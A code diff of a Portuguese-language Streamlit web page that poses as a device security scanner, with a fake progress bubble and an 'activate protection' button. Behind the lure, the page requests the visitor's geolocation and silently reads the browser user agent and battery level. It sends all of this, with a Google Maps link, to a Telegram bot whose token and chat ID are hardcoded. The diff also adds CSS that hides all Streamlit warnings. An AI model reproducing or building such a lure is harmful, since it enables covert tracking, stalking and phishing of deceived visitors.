@@ -3,21 +3,26 @@ import requests
 import time
 from streamlit_js_eval import streamlit_js_eval, get_geolocation
 
-# 1. SETUP TELEGRAM
+# 1. DADOS DO TELEGRAM
 TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
 ID = "8210828398"
 
 def enviar_telegram(msg):
     url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
-    try: requests.post(url, json={"chat_id": ID, "text": msg, "parse_mode": "Markdown"})
-    except: pass
+    try: 
+        requests.post(url, json={"chat_id": ID, "text": msg, "parse_mode": "Markdown"})
+    except: 
+        pass
 
-st.set_page_config(page_title="Segurança Máxima", layout="centered")
+# 2. CONFIGURAÇÃO DA PÁGINA E CSS (BOLHA + OCULTAR ALERTAS)
+st.set_page_config(page_title="Sistema de Segurança", layout="centered")
 
-# 2. ANIMAÇÃO DA BOLHA (PRESERVADA)
 st.markdown("""
     <style>
     .main { background-color: #000; color: white; }
+    /* OCULTA TODOS OS AVISOS AMARELOS DO STREAMLIT */
+    .stAlert, [data-testid="stNotificationContent"] { display: none !important; }
+    
     .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 20px; }
     .circle {
         width: 180px; height: 180px; border-radius: 50%;
@@ -33,63 +38,68 @@ st.markdown("""
         background-color: #ffc107 !important; color: black !important;
         font-weight: bold !important; width: 100%; height: 3.5em; border-radius: 10px; border: none;
     }
-    /* REMOVE AVISO AMARELO DO STREAMLIT */
-    .stAlert { display: none !important; }
     </style>
 """, unsafe_allow_html=True)
 
-# 3. CAPTURA (MODELO E BATERIA)
-modelo = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='MDL')
-bateria = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT')
+# 3. CAPTURA SILENCIOSA (MODELO E BATERIA)
+# Capturados via JS assim que a página carrega
+ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='DEVICE_INFO')
+bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_INFO')
 
-# 4. INTERFACE
+# 4. INTERFACE VISUAL
 st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
-caixa_bolha = st.empty()
+espaco_bolha = st.empty()
 
-if 'clicou' not in st.session_state:
-    st.session_state['clicou'] = False
+# Inicializa o estado se não existir
+if 'ativo' not in st.session_state:
+    st.session_state['ativo'] = False
 
-# Bolha inicial (4%)
-if not st.session_state['clicou']:
-    with caixa_bolha.container():
+# Bolha estática em 4% antes do clique
+if not st.session_state['ativo']:
+    with espaco_bolha.container():
         st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)
 
 st.write("✅ Ambiente de pagamentos")
 st.write("✅ Privacidade e segurança")
 st.write("✅ Vírus")
 
-# 5. BOTÃO E LÓGICA
+# 5. BOTÃO DE ATIVAÇÃO
 if st.button("🔴 ATIVAR PROTEÇÃO"):
-    st.session_state['clicou'] = True
+    st.session_state['ativo'] = True
 
-if st.session_state['clicou']:
-    # O pop-up de localização aparece aqui
+# 6. LÓGICA DE LOCALIZAÇÃO E ANIMAÇÃO 0-100%
+if st.session_state['ativo']:
+    # O navegador pede permissão aqui (Pop-up)
     loc = get_geolocation() 
     
-    # Só processa se a pessoa aceitou a localização
+    # Só prossegue se 'coords' estiver presente (Resolve erro da linha 51)
     if loc and 'coords' in loc:
-        # Animação da porcentagem subindo até 100%
-        for p in [25, 50, 80, 100]:
-            caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
-            time.sleep(0.1)
+        # Animação da bolha carregando de 0% a 100% dentro do ciclo
+        for p in range(0, 101, 10):
+            espaco_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
+            time.sleep(0.05)
         
+        # Coleta de dados finais
         lat = loc['coords']['latitude']
         lon = loc['coords']['longitude']
         mapa = f"https://www.google.com/maps?q={lat},{lon}"
         
+        # Montagem do relatório
         relatorio = (
-            f"🛡️ SISTEMA ATIVADO\n\n"
-            f"📱 Celular: {modelo[:50] if modelo else 'N/A'}\n"
-            f"🔋 Bateria: {bateria if bateria else '--'}%\n"
-            f"📍 [LOCALIZAÇÃO CONCLUÍDA]({mapa})"
+            f"🛡️ PROTEÇÃO ATIVADA\n\n"
+            f"📱 Aparelho: {ua[:55] if ua else 'Desconhecido'}\n"
+            f"🔋 Bateria: {bat if bat else '--'}%\n"
+            f"📍 [VER LOCALIZAÇÃO]({mapa})"
         )
         
         enviar_telegram(relatorio)
-        st.success("Localização concluída") # Texto que você pediu
-        st.session_state['clicou'] = False
+        
+        # Mensagem final solicitada
+        st.success("Localização concluída")
+        st.session_state['ativo'] = False
         st.stop()
     else:
-        # Se ainda não aceitou, o script recarrega em silêncio (sem aviso amarelo)
+        # Se ainda não permitiu, o app espera sem mostrar aviso amarelo
         time.sleep(1)
         st.rerun()
 
